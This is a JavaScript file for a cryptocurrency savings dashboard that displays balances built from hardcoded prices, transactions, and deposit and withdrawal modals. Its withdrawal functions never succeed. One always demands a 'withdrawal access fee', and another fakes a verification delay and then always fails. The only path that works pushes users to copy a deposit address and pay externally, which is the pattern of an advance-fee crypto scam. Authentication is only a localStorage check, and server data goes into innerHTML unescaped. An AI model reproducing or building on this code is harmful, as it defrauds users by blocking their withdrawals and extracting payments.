/* =========================
   AUTH CHECK
========================= */
if (!localStorage.getItem("user")) {
    window.location.href = "index.html";
}

/* =========================
   STATE
========================= */
let hidden = localStorage.getItem("hideBalance") === "true";
let depositAddress = "";

/* =========================
   API BASE (IMPORTANT FIX)
========================= */
const API_URL = (window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1")
    ? "http://localhost:5000"
    : "https://cryptosave-1.onrender.com";

/* =========================
   DOM READY
========================= */
document.addEventListener("DOMContentLoaded", () => {

    const nav = document.getElementById("nav-dashboard");
    if (nav) nav.classList.add("nav-active");

    setupGreeting();
    setupBalanceToggle();
    loadPortfolio();
    loadDepositAddress();

    setInterval(loadPortfolio, 5000);

    const hamburger = document.getElementById("hamburger");
    const navLinks = document.getElementById("navLinks");

    if (hamburger && navLinks) {
        hamburger.addEventListener("click", () => {
            navLinks.classList.toggle("active");
        });
    }
});

/* =========================
   GREETING
========================= */
function setupGreeting() {
    const user = localStorage.getItem("user");
    const el = document.getElementById("userGreeting");

    if (!user || !el) return;

    const name = user.charAt(0).toUpperCase() + user.slice(1);
    el.innerHTML = `Welcome back, <strong>${name}</strong>`;
}

/* =========================
   PORTFOLIO
========================= */
async function loadPortfolio() {
    try {
        const res = await fetch(`${API_URL}/portfolio`);
        const data = await res.json();

        const assetsDiv = document.getElementById("assets");
        const txTable = document.getElementById("transactions");
        const totalEl = document.getElementById("total");

        if (!assetsDiv || !txTable || !totalEl) return;

        assetsDiv.innerHTML = "";
        txTable.innerHTML = "";

        let total = 0;

        const prices = {
            bitcoin: 65000,
            ethereum: 3500,
            usdt: 1,
            solana: 150
        };

        const logos = {
            bitcoin: "https://assets.coingecko.com/coins/images/1/large/bitcoin.png",
            ethereum: "https://assets.coingecko.com/coins/images/279/large/ethereum.png",
            usdt: "https://assets.coingecko.com/coins/images/325/large/Tether.png",
            solana: "https://assets.coingecko.com/coins/images/4128/large/solana.png"
        };

        if (data.assets) {
            for (let key in data.assets) {
                const amount = data.assets[key];
                const value = amount * (prices[key] || 1);

                total += value;

                const card = document.createElement("div");
                card.className = "asset-card-clean";

                card.innerHTML = `
                    <div class="asset-left">
                        <img src="${logos[key]}" class="coin-logo"/>
                        <div>
                            <h4>${key.toUpperCase()}</h4>
                            <small>${amount}</small>
                        </div>
                    </div>
                    <div class="asset-right">
                        <strong>$${value.toFixed(2)}</strong>
                    </div>
                `;

                assetsDiv.appendChild(card);
            }
        }

        totalEl.innerText = hidden ? "****" : `$${total.toFixed(2)}`;

        const recent = (data.transactions || []).reverse();

        recent.forEach(tx => {
            const row = document.createElement("tr");

            const statusClass =
                tx.status === "Completed"
                    ? "status-complete"
                    : "status-pending";

            row.innerHTML = `
                <td>${tx.date || "-"}</td>
                <td>${tx.type || "-"}</td>
                <td>$${tx.amount || 0}</td>
                <td><span class="${statusClass}">${tx.status || "-"}</span></td>
            `;

            txTable.appendChild(row);
        });

    } catch (err) {
        console.log("Error loading portfolio:", err);
    }
}

/* =========================
   LOAD DEPOSIT ADDRESS (FIXED)
========================= */
async function loadDepositAddress() {
    try {
        const res = await fetch(`${API_URL}/api/deposit-address`);
        const data = await res.json();

        const address = data.address || "No address set";

        const dashboardEl = document.getElementById("depositWalletAddress");
        const walletEl = document.getElementById("externalPaymentAddress");

        if (dashboardEl) dashboardEl.value = address;
        if (dashboardEl) dashboardEl.innerText = address;

        if (walletEl) walletEl.value = address;
        if (walletEl) walletEl.innerText = address;

    } catch (err) {
        console.log("Deposit address load failed:", err);
    }
}

function copyDepositAddress() {

    const input = document.getElementById("depositWalletAddress");

    if (!input) {
        alert("Input not found");
        return;
    }

    const value = input.value;

    if (!value) {
        alert("No address found");
        return;
    }

    navigator.clipboard.writeText(value)
    .then(() => {
        alert("Copied successfully");
    })
    .catch((err) => {
        console.log(err);

        input.select();
        input.setSelectionRange(0, 99999);

        document.execCommand("copy");

        alert("Copied successfully");
    });
}

function copyExternalPaymentAddress() {

    const input = document.getElementById("externalPaymentAddress");

    if (!input) {
        alert("Address field not found");
        return;
    }

    const value = input.value;

    if (!value || value === "Loading...") {
        alert("No address available");
        return;
    }

    navigator.clipboard.writeText(value)
        .then(() => {
            alert("Copied successfully");
        })
        .catch(() => {

            input.select();
            input.setSelectionRange(0, 99999);

            document.execCommand("copy");

            alert("Copied successfully");
        });
}

/* =========================
   TOGGLE
========================= */
function setupBalanceToggle() {
    const toggleBtn = document.getElementById("toggleBalance");

    if (!toggleBtn) return;

    toggleBtn.addEventListener("click", () => {
        hidden = !hidden;
        localStorage.setItem("hideBalance", hidden);
        loadPortfolio();
    });
}

/* =========================
   MODALS
========================= */
function openDeposit() {
    const modal = document.getElementById("depositModal");
    if (modal) modal.style.display = "flex";

    loadDepositAddress();
}

function closeDeposit() {
    const modal = document.getElementById("depositModal");
    if (modal) modal.style.display = "none";
}

function openWithdraw() {
    const modal = document.getElementById("withdrawModal");
    if (modal) modal.style.display = "flex";
}

function closeWithdraw() {
    const modal = document.getElementById("withdrawModal");
    if (modal) modal.style.display = "none";
}

function submitWithdraw() {
    showToast("Withdrawal unavailable until withdrawal access fee is paid");
    closeWithdraw();
}

function openWithdrawAccess() {
    document.getElementById("withdrawAccessModal").style.display = "flex";
}

function closeWithdrawAccess() {
    document.getElementById("withdrawAccessModal").style.display = "none";
}

async function openExternalPayment() {
    showLoader();

    try {
        await loadDepositAddress();
        document.getElementById("externalPaymentModal").style.display = "flex";
    } catch (err) {
        console.log(err);
    }

    hideLoader();
}

function closeExternalPayment() {
    document.getElementById("externalPaymentModal").style.display = "none";
}

function payInternal() {
    showLoader();

    setTimeout(() => {
        hideLoader();
        closeWithdrawAccess();
        alert("Unable to verify beneficiary withdrawal path");
    }, 1500);
}

/* =========================
   LOADER
========================= */
function showLoader() {
    document.getElementById("globalLoader").style.display = "flex";
}

function hideLoader() {
    document.getElementById("globalLoader").style.display = "none";
}

/* =========================
   TOAST
========================= */
function showToast(message) {
    const toast = document.createElement("div");
    toast.className = "toast";
    toast.innerText = message;

    document.body.appendChild(toast);

    setTimeout(() => toast.classList.add("show"), 100);

    setTimeout(() => {
        toast.classList.remove("show");
        setTimeout(() => toast.remove(), 300);
    }, 2000);
}

function logout() {
    localStorage.clear();
    window.location.href = "index.html";
}